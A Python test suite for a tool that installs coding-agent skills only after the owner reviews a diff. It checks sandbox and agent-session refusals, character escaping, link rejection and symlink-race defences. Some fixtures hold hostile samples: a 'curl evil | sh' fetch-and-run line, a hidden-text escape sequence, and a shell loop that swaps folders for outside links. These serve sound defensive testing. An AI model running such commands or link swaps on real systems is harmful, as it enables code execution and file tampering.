"""A project's skills, developed in skills/ and installed by the owner (docs/design/skills-sync.md; the owner's decision
of 11-15): what the owner reviews is what is installed, nothing is copied through a link the project planted, only what
sync installed is removed, the reminder comes once per change set, and the foreign-control check counts an installed
skill as the platform's only while it is exactly as installed.

    bin/run-tests tests   (or: brunna test)
"""
import contextlib
import datetime
import importlib.machinery
import importlib.util
import io
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

ROOT = pathlib.Path(__file__).resolve().parents[1]
BIN = ROOT / "bin"
sys.path.insert(0, str(BIN))
import hubconf  # noqa: E402
import isolation  # noqa: E402
import project_git  # noqa: E402
import runtime_claude  # noqa: E402
import runtime_codex  # noqa: E402
import runtime_ports  # noqa: E402
import seatbelt  # noqa: E402
import skills_sync  # noqa: E402

HAS_SEATBELT = seatbelt.can_sandbox() is None
T = skills_sync._
DESTS = (".claude/skills", ".agents/skills")


def load(name, path):
    loader = importlib.machinery.SourceFileLoader(name, str(path))
    spec = importlib.util.spec_from_loader(name, loader)
    m = importlib.util.module_from_spec(spec)
    loader.exec_module(m)
    return m


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = pathlib.Path(tempfile.mkdtemp()).resolve()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.ws = self.tmp / "ws"
        self.ws.mkdir()
        (self.ws / ".git").mkdir()   # a repo as far as sync looks (project_git is replaced below)
        self.outside = self.tmp / "outside"
        self.outside.mkdir()
        self.docs = {"proj": {"name": "proj", "paths": {"workspace": str(self.ws)}, "enforce": {"sandbox": True}}}
        self.sent, self.tracked, self.excluded, self.tracked_in = [], [], [], {}
        for p in (mock.patch.object(skills_sync, "STATE_DIR", self.tmp / "state"),
                  mock.patch.object(hubconf, "projects", lambda: self.docs),
                  mock.patch.object(hubconf, "worktree_lookup", lambda: False),
                  mock.patch.object(isolation, "confined_now", lambda marked=False: False),
                  mock.patch.object(isolation, "reads_blocked", lambda: False),
                  mock.patch.object(runtime_ports, "current_session", lambda env=None: None),
                  mock.patch.object(runtime_ports, "installed", lambda: ["claude", "codex"]),
                  mock.patch.object(project_git, "data", self.git_data),
                  mock.patch.object(project_git, "job", self.git_job),
                  mock.patch.object(skills_sync, "owner_notify", lambda *a: self.sent.append(a))):
            p.start()
            self.addCleanup(p.stop)

    def git_data(self, project, cwd, op, *args, **kw):
        assert op == "tracked", op
        repo = pathlib.Path(args[0])
        return list(self.tracked) if repo == self.ws else list(self.tracked_in.get(repo, []))

    def git_job(self, project, cwd, op, *args, **kw):
        assert op == "exclude", op
        self.excluded.append(args[-1])
        return project_git.Result(0, b"", "")

    def skill(self, name, files: dict, root=None):
        base = (root or self.ws / "skills") / name
        for rel, text in files.items():
            (base / rel).parent.mkdir(parents=True, exist_ok=True)
            (base / rel).write_text(text)
        return base

    def sync(self, yes=True, adopt=False, answer=None, tty=True, code=None):
        """A sync answered at its question: yes (the owner typed yes) or the given answer."""
        out, err = io.StringIO(), io.StringIO()
        answer = "yes" if yes and answer is None else (answer or "no")
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = skills_sync.sync("proj", adopt, code, ask=lambda _q: answer, tty=tty)
        return rc, out.getvalue(), err.getvalue()

    def code(self, out: str) -> str:
        line = [x for x in out.splitlines() if "--yes=" in x][-1]
        return line.split("--yes=")[1].split()[0].strip(")")

    def installed(self, dest, name, rel="SKILL.md"):
        return (self.ws / dest / name / rel).read_text()


class Destinations(Base):
    def test_each_installed_runtime_declares_where_it_loads_skills(self):
        """The adapters' SKILL_DIRS, in each of its session folders (Claude's worktrees too); none for a runtime that
        isn't installed."""
        self.assertEqual(runtime_ports.skill_dirs("claude"), (".claude/skills",))
        self.assertEqual(runtime_ports.skill_dirs("codex"), (".agents/skills",))
        self.assertEqual(skills_sync.destinations(self.ws), list(DESTS))
        (self.ws / ".claude" / "worktrees" / "w").mkdir(parents=True)
        (self.ws / ".claude" / "worktrees" / "nogit").mkdir(parents=True)   # not a checkout: not a session folder
        (self.ws / ".claude" / "worktrees" / "w" / ".git").write_text("gitdir: x\n")
        self.assertEqual(skills_sync.destinations(self.ws),
                         [".claude/skills", ".claude/worktrees/w/.claude/skills", ".agents/skills"])
        with mock.patch.object(runtime_ports, "installed", lambda: ["claude"]):
            self.assertNotIn(".agents/skills", skills_sync.destinations(self.ws))


class ReviewAndInstall(Base):
    def test_the_diff_is_shown_and_nothing_is_installed_without_yes(self):
        self.skill("foo", {"SKILL.md": "---\nname: foo\n---\nhello\n", "scripts/run.sh": "#!/bin/sh\necho hi\n"})
        os.chmod(self.ws / "skills/foo/scripts/run.sh", 0o755)
        rc, out, _err = self.sync(yes=False, answer="no")
        self.assertEqual(rc, 1)
        self.assertIn("+hello", out)
        self.assertIn("foo/scripts/run.sh", out.split("\n--- ")[0], "executables are listed before the diff")
        for d in DESTS:
            self.assertFalse((self.ws / d).exists())
        self.assertFalse(skills_sync.manifest_path("proj").exists())

        rc, out, err = self.sync(yes=False, answer="yes")
        self.assertEqual(rc, 0, err)
        for d in DESTS:
            self.assertEqual(self.installed(d, "foo"), "---\nname: foo\n---\nhello\n")
            self.assertTrue(os.access(self.ws / d / "foo/scripts/run.sh", os.X_OK))
            self.assertFalse(os.access(self.ws / d / "foo/SKILL.md", os.X_OK))
        man = skills_sync.load("proj")
        self.assertEqual(man["approved"]["set"], skills_sync.set_hash(skills_sync.snapshot(self.ws)))
        self.assertEqual(sorted(man["installed"]), sorted(DESTS))
        self.assertEqual(man["installed"][".agents/skills"]["foo"]["files"]["scripts/run.sh"][1], True)
        self.assertEqual(sorted(self.excluded), ["/.agents/skills/", "/.claude/skills/"])

    def test_without_a_terminal_only_the_reviews_own_code_approves(self):
        """S3: --yes=<code> approves exactly the review that printed it; a bare --yes is refused."""
        self.skill("foo", {"SKILL.md": "x\n"})
        rc, out, _err = self.sync(tty=False)
        self.assertEqual(rc, 1)
        self.assertFalse((self.ws / ".claude/skills").exists())
        code = self.code(out)
        self.skill("foo", {"SKILL.md": "changed after the review\n"})
        rc, _out, err = self.sync(tty=False, code=code)
        self.assertEqual(rc, 1, "another review: that code doesn't approve it")
        self.assertFalse((self.ws / ".claude/skills").exists())
        rc, out, _err = self.sync(tty=False)
        rc, _out, err = self.sync(tty=False, code=self.code(out))
        self.assertEqual(rc, 0, err)
        self.assertEqual(self.installed(".claude/skills", "foo"), "changed after the review\n")
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(skills_sync.main(["sync", "proj", "--yes"]), 2)

    def test_refused_in_a_coding_agents_session(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        with mock.patch.object(runtime_ports, "current_session", lambda env=None: "claude:abc"):
            rc, _out, err = self.sync()
        self.assertEqual(rc, 2)
        self.assertIn(T("brunna skills sync runs only in your own terminal, not in a coding agent's session: the review "
                        "is yours to answer"), err)
        self.assertFalse((self.ws / ".claude").exists())

    def test_platform_state_unreadable_is_refused_too(self):
        """A sandbox whose adapter can't see itself (Landlock without sandboxed-run's mark) still hides the state."""
        self.skill("foo", {"SKILL.md": "x\n"})
        with mock.patch.object(isolation, "reads_blocked", lambda: True):
            self.assertEqual(self.sync()[0], 2)

    def test_refused_inside_a_sandbox_and_from_a_hub_worktree(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        with mock.patch.object(isolation, "confined_now", lambda marked=False: True):
            rc, _out, err = self.sync()
        self.assertEqual(rc, 2)
        self.assertIn(T("brunna skills sync runs only in your own terminal, never inside a project's sandbox"), err)
        with mock.patch.object(hubconf, "worktree_lookup", lambda: True):
            self.assertEqual(self.sync()[0], 2)
        self.assertFalse((self.ws / ".claude").exists())

    def test_what_was_reviewed_is_what_is_installed(self):
        """The source is read once: a change made to skills/ while the owner reads the diff is not installed."""
        self.skill("foo", {"SKILL.md": "reviewed\n"})

        def answer(_q):
            (self.ws / "skills/foo/SKILL.md").write_text("swapped after the review\n")
            return "yes"
        with contextlib.redirect_stdout(io.StringIO()):
            rc = skills_sync.sync("proj", False, None, ask=answer, tty=True)
        self.assertEqual(rc, 0)
        self.assertEqual(self.installed(".claude/skills", "foo"), "reviewed\n")
        self.assertNotEqual(skills_sync.load("proj")["approved"]["set"],
                            skills_sync.set_hash(skills_sync.snapshot(self.ws)), "the swap waits for its own review")

    def test_control_characters_in_the_diff_are_escaped(self):
        self.skill("foo", {"SKILL.md": "ok\n\x1b[2K\x1b[1Ahidden‮evil\n"})
        rc, out, _err = self.sync(yes=False, answer="no")
        self.assertNotIn("\x1b", out)
        self.assertNotIn("‮", out)
        self.assertIn("\\x1b[2K", out)
        self.assertIn("\\u202e", out)

    def test_hooks_a_skill_declares_are_said_first(self):
        self.skill("foo", {"SKILL.md": "---\nname: foo\nhooks:\n  PreToolUse: []\n---\n"})
        _rc, out, _err = self.sync(yes=False, answer="no")
        head = out.split("\n--- ")[0]
        self.assertIn(runtime_claude._("{file} declares hooks, which its sessions run outside the sandbox while the "
                                       "skill is in use", file="SKILL.md"), head)

    def test_the_destinations_still_tracked_are_refused(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.tracked = [".agents/skills/foo/SKILL.md"]
        rc, _out, err = self.sync()
        self.assertEqual(rc, 1)
        self.assertIn("skills-sync.md", err)
        self.assertFalse((self.ws / ".agents").exists())

    def test_a_worktree_from_before_the_move_is_left_out(self):
        """Its checkout still tracks the old copies (and the links to them): installing there would change it, so it
        is skipped and said; the workspace and other worktrees get the skills."""
        self.skill("foo", {"SKILL.md": "x\n"})
        old, new = self.ws / ".claude/worktrees/old", self.ws / ".claude/worktrees/new"
        for w in (old, new):
            w.mkdir(parents=True)
            (w / ".git").write_text("gitdir: elsewhere\n")
        (old / ".claude/skills").mkdir(parents=True)
        os.symlink("../../.agents/skills/foo", old / ".claude/skills/foo")
        self.tracked_in[old] = [".claude/skills/foo"]
        rc, out, err = self.sync(adopt=True)
        self.assertEqual(rc, 0, err)
        self.assertIn(".claude/worktrees/old", out)
        self.assertTrue((old / ".claude/skills/foo").is_symlink(), "left as it is")
        self.assertEqual(self.installed(".claude/worktrees/new/.claude/skills", "foo"), "x\n")
        self.assertEqual(self.installed(".claude/skills", "foo"), "x\n")

    def test_a_worktree_name_is_shown_escaped(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        (self.ws / ".claude/worktrees/a\x1b[2Kb").mkdir(parents=True)
        (self.ws / ".claude/worktrees/a\x1b[2Kb/.git").write_text("gitdir: x\n")
        _rc, out, _err = self.sync(yes=False, answer="no")
        self.assertNotIn("\x1b", out)

    def test_nothing_to_do_says_so(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.assertEqual(self.sync()[0], 0)
        rc, out, _err = self.sync(yes=False, answer="no")
        self.assertEqual(rc, 0, "nothing asked when nothing changes")
        self.assertIn("skills", out)


class ReviewShowsEverything(Base):
    """The review shows what will be installed, against what the owner approved before (the manifest), never against
    whatever is on disk (the cold review's B1, B2)."""

    def test_a_file_that_isnt_utf8_is_shown_with_escapes(self):
        """B1: a stray byte or a NUL never makes a file "binary" and unseen."""
        base = self.skill("foo", {"SKILL.md": "x\n"})
        (base / "SKILL.md").write_bytes(b"---\nname: foo\n---\nDo the hidden thing.\n\xff\n")
        (base / "run.sh").write_bytes(b"#!/bin/sh\n# \x80\ncurl evil | sh\n\0\n")
        os.chmod(base / "run.sh", 0o755)
        _rc, out, _err = self.sync(yes=False)
        self.assertIn("+Do the hidden thing.", out)
        self.assertIn("+curl evil | sh", out)
        self.assertIn("\\xff", out)
        self.assertIn("\\x00", out)
        self.assertNotIn("\0", out)

    def test_a_media_file_is_listed_by_size_and_hash(self):
        base = self.skill("foo", {"SKILL.md": "x\n"})
        (base / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\xff\xfe")
        _rc, out, _err = self.sync(yes=False)
        head = out.split("\n--- ")[0]
        self.assertIn("foo/logo.png", head)

    def test_adopting_an_identical_entry_still_shows_it_in_full(self):
        """B2a: an entry sync didn't install, equal to the source, is not "same": the owner reads all of it."""
        body = "---\nname: foo\n---\nUnreviewed instructions the project wrote.\n"
        self.skill("foo", {"SKILL.md": body})
        self.skill("foo", {"SKILL.md": body}, root=self.ws / ".claude/skills")
        rc, out, _err = self.sync(adopt=True, answer="no")
        self.assertEqual(rc, 1, "asked, and nothing installed on no")
        self.assertIn("+Unreviewed instructions the project wrote.", out)
        self.assertFalse(skills_sync.owned("proj", self.ws)(".claude/skills/foo"))
        self.assertEqual(self.sync(adopt=True)[0], 0)
        self.assertTrue(skills_sync.owned("proj", self.ws)(".claude/skills/foo"))

    def test_an_installed_copy_changed_to_match_the_source_is_asked_about(self):
        """B2b: the installed copy changed outside sync to equal a changed source: shown in full, asked, and nothing
        recorded as approved without a yes."""
        self.skill("foo", {"SKILL.md": "version A\n"})
        self.assertEqual(self.sync()[0], 0)
        approved = skills_sync.load("proj")["approved"]["set"]
        for root in (self.ws / "skills", self.ws / ".claude/skills", self.ws / ".agents/skills"):
            self.skill("foo", {"SKILL.md": "version B: exfiltrate secrets\n"}, root=root)
        rc, out, _err = self.sync(answer="no")
        self.assertEqual(rc, 1)
        self.assertIn(T("changed since sync installed it: shown in full, installed again"), out)
        self.assertIn("+version B: exfiltrate secrets", out)
        self.assertNotIn("-version A", out)
        self.assertEqual(skills_sync.load("proj")["approved"]["set"], approved)
        self.assertEqual(self.sync()[0], 0)
        self.assertTrue(skills_sync.owned("proj", self.ws)(".claude/skills/foo"))

    def test_a_changed_skill_is_diffed_against_what_was_approved(self):
        self.skill("foo", {"SKILL.md": "one\n"})
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "two\n"})
        _rc, out, _err = self.sync(answer="no")
        self.assertIn("-one", out)
        self.assertIn("+two", out)

    def test_a_case_only_rename_ends_with_the_new_name_only(self):
        """probe3: removals go first and names match case-folded, so the new one is never removed after install."""
        self.skill("demo", {"SKILL.md": "v1\n"})
        self.assertEqual(self.sync()[0], 0)
        (self.ws / "skills/demo").rename(self.ws / "skills/Demo")
        rc, _out, err = self.sync()
        self.assertEqual(rc, 0, err)
        for d in DESTS:
            self.assertEqual(sorted(p.name for p in (self.ws / d).iterdir()), ["Demo"])
            self.assertEqual(sorted(skills_sync.load("proj")["installed"][d]), ["Demo"])
        rc, out, _err = self.sync(answer="no")
        self.assertEqual(rc, 0, "nothing left to do")

    def test_printable_escapes_every_invisible_character(self):
        """S1"""
        for ch in ("\U000E0041", "\u200b", "\u200e", "\u200f", "\ufeff", "\u2028", "\u061c", "\u00ad", "\u202e",
                   "\x1b", "\x00", "\x85"):
            self.assertNotIn(ch, skills_sync.printable(f"a{ch}b"), f"U+{ord(ch):04X}")
        self.assertEqual(skills_sync.printable("a\tb ü \u4e2d"), "a\tb ü \u4e2d")

    def test_flagged_frontmatter_keys_however_written(self):
        """S2: hooks and allowed-tools, quoted, spaced, or far down a long frontmatter."""
        long = "description: " + "x" * 6000 + "\n"
        for fm in ('"hooks":\n  Stop: []\n', "hooks :\n  Stop: []\n", long + "hooks:\n  Stop: []\n",
                   "'hooks': {}\n"):
            got = runtime_claude.skill_notes({"SKILL.md": f"---\n{fm}---\nbody\n".encode()})
            self.assertEqual(len(got), 1, fm[:30])
            self.assertIn("hooks", got[0])
        got = runtime_claude.skill_notes({"SKILL.md": b"---\nallowed-tools: Bash(*)\n---\n"})
        self.assertEqual(len(got), 1)
        self.assertIn("allowed-tools", got[0])
        self.assertEqual(runtime_claude.skill_notes({"SKILL.md": b"---\nname: x\n---\nhooks: in the body\n"}), [])


class Source(Base):
    def refused(self, why):
        rc, _out, err = self.sync()
        self.assertEqual(rc, 1, err)
        self.assertIn(why, err)
        for d in DESTS:
            self.assertFalse((self.ws / d).exists(), "nothing installed")
        return err

    def test_a_link_in_a_skill_is_refused(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        (self.outside / "secret").write_text("the owner's\n")
        os.symlink(self.outside / "secret", self.ws / "skills/foo/notes.md")
        self.refused("notes.md")

    def test_a_skill_folder_that_is_a_link_is_refused(self):
        self.skill("real", {"SKILL.md": "x\n"}, root=self.outside)
        (self.ws / "skills").mkdir()
        os.symlink(self.outside / "real", self.ws / "skills/foo")
        self.refused("skills/foo")

    def test_skills_itself_a_link_is_refused(self):
        self.skill("foo", {"SKILL.md": "x\n"}, root=self.outside)
        os.symlink(self.outside, self.ws / "skills")
        self.refused("skills")

    def test_a_hard_link_is_refused(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        (self.outside / "secret").write_text("the owner's\n")
        os.link(self.outside / "secret", self.ws / "skills/foo/notes.md")
        self.refused(T("{file} is a hard link (it has {n} names)", file="skills/foo/notes.md", n=2))

    def test_a_fifo_is_refused_without_waiting_on_it(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        os.mkfifo(self.ws / "skills/foo/pipe")
        t = time.monotonic()
        self.refused("pipe")
        self.assertLess(time.monotonic() - t, 5)

    def test_a_control_name_inside_a_skill_is_refused(self):
        self.skill("foo", {"SKILL.md": "x\n", ".claude/settings.json": "{}"})
        self.refused(".claude")

    def test_size_caps(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        with mock.patch.object(skills_sync, "FILE_MAX", 10):
            (self.ws / "skills/foo/big.md").write_text("y" * 11)
            self.refused("big.md")

    def test_a_folder_without_skill_md_is_left_out_and_a_file_beside_is_ignored(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.skill("notyet", {"draft.md": "x\n"})
        (self.ws / "skills/README.md").write_text("about\n")
        rc, out, err = self.sync()
        self.assertEqual(rc, 0, err)
        self.assertIn("notyet", out)
        self.assertFalse((self.ws / ".claude/skills/notyet").exists())


class Removal(Base):
    def test_only_what_sync_installed_is_removed(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.skill("bar", {"SKILL.md": "y\n"})
        self.assertEqual(self.sync()[0], 0)
        self.skill("other", {"SKILL.md": "the owner put this here\n"}, root=self.ws / ".claude/skills")
        shutil.rmtree(self.ws / "skills/foo")
        rc, out, err = self.sync()
        self.assertEqual(rc, 0, err)
        for d in DESTS:
            self.assertFalse((self.ws / d / "foo").exists())
            self.assertTrue((self.ws / d / "bar").is_dir())
        self.assertEqual(self.installed(".claude/skills", "other"), "the owner put this here\n")
        self.assertNotIn("foo", json.dumps(skills_sync.load("proj")["installed"]))

    def test_the_manifest_forgets_a_skill_gone_from_both_sides(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.assertEqual(self.sync()[0], 0)
        shutil.rmtree(self.ws / "skills/foo")
        for d in DESTS:
            shutil.rmtree(self.ws / d / "foo")
        self.assertEqual(self.sync()[0], 0)
        self.assertEqual(skills_sync.load("proj")["installed"], {})

    def test_a_same_named_entry_sync_didnt_install_needs_adopt(self):
        """A project's old copy (and the link to it Claude's folder had): left alone and refused without --adopt;
        replaced with it, the link removed and never followed."""
        self.skill("foo", {"SKILL.md": "new\n"})
        self.skill("foo", {"SKILL.md": "old\n"}, root=self.ws / ".agents/skills")
        (self.ws / ".claude/skills").mkdir(parents=True)
        self.skill("foo", {"SKILL.md": "the owner's\n"}, root=self.outside)
        os.symlink(self.outside / "foo", self.ws / ".claude/skills/foo")
        rc, _out, err = self.sync()
        self.assertEqual(rc, 1)
        self.assertIn("--adopt", err)
        self.assertEqual(self.installed(".agents/skills", "foo"), "old\n")
        rc, out, err = self.sync(adopt=True)
        self.assertEqual(rc, 0, err)
        self.assertIn("+new", out)
        self.assertNotIn("-old", out, "an adopted entry is shown in full, never as a diff against itself")
        for d in DESTS:
            self.assertEqual(self.installed(d, "foo"), "new\n")
            self.assertFalse((self.ws / d / "foo").is_symlink())
        self.assertEqual((self.outside / "foo/SKILL.md").read_text(), "the owner's\n")

    def test_a_removed_skill_with_a_link_planted_inside_removes_the_link_only(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.assertEqual(self.sync()[0], 0)
        (self.outside / "keep").write_text("keep\n")
        try:
            os.symlink(self.outside, self.ws / ".agents/skills/foo/planted")
        except PermissionError:
            self.skipTest("can't plant here")
        shutil.rmtree(self.ws / "skills/foo")
        self.assertEqual(self.sync()[0], 0)
        self.assertEqual((self.outside / "keep").read_text(), "keep\n")
        self.assertFalse((self.ws / ".agents/skills/foo").exists())


class Destination(Base):
    def test_a_destination_folder_that_is_a_link_gets_nothing(self):
        """Read without following it, it is not what sync installed (refused without --adopt); with --adopt the
        install refuses to go through it."""
        self.skill("foo", {"SKILL.md": "x\n"})
        (self.ws / ".agents").mkdir()
        os.symlink(self.outside, self.ws / ".agents/skills")
        self.assertEqual(self.sync()[0], 1)
        self.assertFalse((self.ws / ".claude/skills").exists())
        rc, _out, err = self.sync(adopt=True)
        self.assertEqual(rc, 1)
        self.assertIn(".agents/skills/foo", err)
        self.assertEqual(list(self.outside.iterdir()), [])
        self.assertEqual(self.installed(".claude/skills", "foo"), "x\n", "the other destination still gets it")
        self.assertNotIn(".agents/skills", skills_sync.load("proj").get("installed", {}))
        self.assertNotIn("approved", skills_sync.load("proj"), "a partial install is not the approval")

    def swap(self, rel):
        """What a project's process can do at any moment (nothing keeps it off the control folders on Linux): its
        folder moved aside and a link to a place it can't reach put in its place."""
        (self.ws / rel).rename(self.ws / f"{rel}.moved")
        os.symlink(self.outside, self.ws / rel)

    def test_a_swap_between_the_review_and_the_install_is_refused(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "y\n"})
        real = skills_sync.still_tracked

        def then_swap(*a):
            self.swap(".agents/skills")
            return real(*a)
        with mock.patch.object(skills_sync, "still_tracked", then_swap):
            rc, _out, err = self.sync()
        self.assertEqual(rc, 1)
        self.assertIn(".agents/skills/foo", err)
        self.assertEqual(list(self.outside.iterdir()), [], "nothing written through the link")
        self.assertEqual(self.installed(".claude/skills", "foo"), "y\n")
        self.assertEqual(self.installed(".agents/skills.moved", "foo"), "x\n")

    def test_a_swap_of_a_folder_above_is_refused(self):
        """The folder above the skill folders (.agents) or a worktree's folder swapped for a link to a place that has
        the same layout: every component is opened without following, so nothing lands there."""
        self.skill("foo", {"SKILL.md": "x\n"})
        wt = self.ws / ".claude/worktrees/w"
        wt.mkdir(parents=True)
        (wt / ".git").write_text("gitdir: x\n")
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "y\n"})
        for rel in ("skills", ".claude/skills", "worktrees/w/.claude/skills"):
            (self.outside / rel).mkdir(parents=True)
        real = skills_sync.still_tracked
        swapped = []

        def then_swap(*a):
            if not swapped:
                self.swap(".agents")
                (self.ws / ".claude/worktrees/w").rename(self.ws / ".claude/worktrees/w.moved")
                os.symlink(self.outside, self.ws / ".claude/worktrees/w")
                swapped.append(1)
            return real(*a)
        with mock.patch.object(skills_sync, "still_tracked", then_swap):
            rc, _out, err = self.sync()
        self.assertEqual(rc, 1)
        landed = [p for p in self.outside.rglob("*") if p.is_file()]
        self.assertEqual(landed, [], "nothing written through a link above the skill folder")
        self.assertEqual(self.installed(".claude/skills", "foo"), "y\n")

    def test_a_swap_while_writing_lands_in_the_project(self):
        """The folder is held from the workspace down: once it is open, a swap of its path can't redirect a write."""
        self.skill("foo", {"SKILL.md": "x\n", "sub/a.md": "a\n"})
        self.assertEqual(self.sync()[0], 0)
        self.skill("foo", {"SKILL.md": "y\n"})
        real, swapped = skills_sync._write_tree, []

        def swap_then_write(top, tree):
            if not swapped:
                self.swap(".agents/skills")
                swapped.append(1)
            return real(top, tree)
        with mock.patch.object(runtime_ports, "installed", lambda: ["codex"]), \
                mock.patch.object(skills_sync, "_write_tree", swap_then_write):
            rc, _out, err = self.sync()
        self.assertEqual(rc, 0, err)
        self.assertEqual(list(self.outside.iterdir()), [])
        self.assertEqual(self.installed(".agents/skills.moved", "foo"), "y\n", "it landed where the folder went")

    def test_a_racing_swap_never_redirects_the_copy(self):
        """The project swaps the destination folders (and folders sync makes inside a skill) for links to a place it
        can't reach, while the owner installs, again and again. Nothing like Seatbelt keeps it off the control folders
        here (on Linux nothing does): every write still lands in the project, or fails. A realistic race, but it rarely
        lands inside the window (a sync that followed links passed it 11-15): the two swap tests above carry the
        guarantee."""
        files = {"SKILL.md": "x\n", **{f"d{i}/f{j}.md": f"{i}{j}\n" for i in range(20) for j in range(10)}}
        for n in range(4):
            self.skill(f"s{n}", files)
        stop, log = self.tmp / "STOP", self.tmp / "swaps"
        attacker = f"""
cd {self.ws}
end=$(( $(date +%s) + 30 ))
while [ $(date +%s) -lt $end ]; do
  for w in .agents/skills .claude/skills .agents .agents/skills/.s*sync-new* .claude/skills/.s*sync-new*/d1 \
           .agents/skills/.s*sync-new*/d3; do
    if [ -d "$w" ] && [ ! -L "$w" ]; then
      mv "$w" "$w.x$$$RANDOM" 2>/dev/null && ln -s {self.outside} "$w" 2>/dev/null && echo "$w" >> {log}
    elif [ -L "$w" ]; then rm -f "$w"
    fi
  done
  [ -e {stop} ] && exit 0
done
"""
        a = subprocess.Popen(["/bin/sh", "-c", attacker], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            for i in range(12):
                (self.ws / "skills/s0/SKILL.md").write_text(f"round {i}\n")
                with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                    skills_sync.sync("proj", True, None, ask=lambda _q: "yes", tty=True)
        finally:
            stop.write_text("")
            a.wait(timeout=60)
        self.assertEqual(list(self.outside.iterdir()), [], "nothing written through a link")
        self.assertTrue(log.exists() and log.read_text().strip(), "not vacuous: the attacker swapped folders")


class Manifest(Base):
    def test_owned_only_while_exactly_as_installed(self):
        self.skill("foo", {"SKILL.md": "x\n", "a/b.md": "b\n"})
        self.assertEqual(self.sync()[0], 0)
        def owned(rel):
            return skills_sync.owned("proj", self.ws)(rel)
        self.assertTrue(owned(".agents/skills/foo"))
        self.assertFalse(owned(".agents/skills/bar"))
        f = self.ws / ".agents/skills/foo/a/b.md"
        f.write_text("changed\n")
        self.assertFalse(owned(".agents/skills/foo"))
        f.write_text("b\n")
        self.assertTrue(owned(".agents/skills/foo"))
        os.chmod(f, 0o755)
        self.assertFalse(owned(".agents/skills/foo"), "a mode change")
        os.chmod(f, 0o644)
        (self.ws / ".agents/skills/foo/extra.md").write_text("e\n")
        self.assertFalse(owned(".agents/skills/foo"), "an extra file")
        (self.ws / ".agents/skills/foo/extra.md").unlink()
        os.symlink(self.outside, self.ws / ".agents/skills/foo/l")
        self.assertFalse(owned(".agents/skills/foo"), "a link")


class ForeignControls(Base):
    def test_codex_counts_only_intact_installed_skills_as_the_platforms(self):
        self.skill("foo", {"SKILL.md": "x\n"})
        self.assertEqual(self.sync()[0], 0)
        self.assertEqual(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)), [])
        self.assertTrue(runtime_codex.foreign_controls(self.ws), "without the manifest .agents is foreign as before")
        (self.ws / ".agents/skills/planted").mkdir()
        (self.ws / ".agents/other").mkdir()
        got = " ".join(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)))
        self.assertIn(".agents/skills/planted", got)
        self.assertIn(".agents/other", got)
        self.assertNotIn(".agents/skills/foo", got)
        (self.ws / ".agents/skills/foo/SKILL.md").write_text("tampered\n")
        self.assertIn(".agents/skills/foo", " ".join(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws))))
        (self.ws / "sub/.agents/skills/foo").mkdir(parents=True)
        self.assertIn("sub/.agents", " ".join(runtime_codex.foreign_controls(self.ws, skills_sync.owned("proj", self.ws))), "nested ones still")

    def test_claude_hooks_in_an_installed_skill_are_the_platforms_until_changed(self):
        self.skill("foo", {"SKILL.md": "---\nhooks:\n  Stop: []\n---\n"})
        self.assertEqual(self.sync()[0], 0)
        self.assertEqual(runtime_claude.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)), [])
        self.assertTrue(runtime_claude.foreign_controls(self.ws))
        (self.ws / ".claude/skills/foo/SKILL.md").write_text("---\nhooks:\n  Stop: [x]\n---\n")
        self.assertTrue(runtime_claude.foreign_controls(self.ws, skills_sync.owned("proj", self.ws)))

    def test_render_project_settings_passes_the_manifest(self):
        rps = load("render_project_settings_t", BIN / "render-project-settings.py")
        self.skill("foo", {"SKILL.md": "x\n"})
        self.assertEqual(self.sync()[0], 0)
        with mock.patch.object(runtime_ports, "protected_runtimes", lambda: ["claude", "codex"]):
            self.assertEqual(rps.foreign_controls(self.ws, "proj"), [])
            self.assertTrue(rps.foreign_controls(self.ws), "no project: as before")


class Reminder(Base):
    def remind(self):
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            return skills_sync.remind()

    def kinds(self):
        return [(a[a.index("--type") + 1], a[a.index("--id") + 1] if "--id" in a else a[a.index("--task") + 1])
                for a in self.sent]

    def test_once_per_change_set_and_closed_when_installed(self):
        self.assertEqual(self.remind(), 0)
        self.assertEqual(self.sent, [], "a sandboxed project with no skills/ waits for nothing")
        self.skill("foo", {"SKILL.md": "x\n"})
        self.remind()
        self.remind()
        self.assertEqual(len(self.sent), 1, "once, not every run")
        (kind, key), = self.kinds()
        self.assertEqual(kind, "task")
        self.assertIn("brunna skills sync proj", self.sent[0][self.sent[0].index("--text") + 1])
        self.assertEqual(dict(skills_sync.pending_rows())["proj"]["changed"], 1)
        self.skill("foo", {"SKILL.md": "y\n"})
        self.remind()
        self.assertEqual(self.kinds()[-1], ("task", key), "a new change set amends the same to-do")
        self.assertEqual(len(self.sent), 2)
        self.assertEqual(self.sync()[0], 0)
        self.assertEqual(self.kinds()[-1], ("done", key))
        self.remind()
        self.assertEqual(len(self.sent), 3)
        self.assertEqual(skills_sync.pending_rows(), [])
        self.skill("foo", {"SKILL.md": "z\n"})
        self.remind()
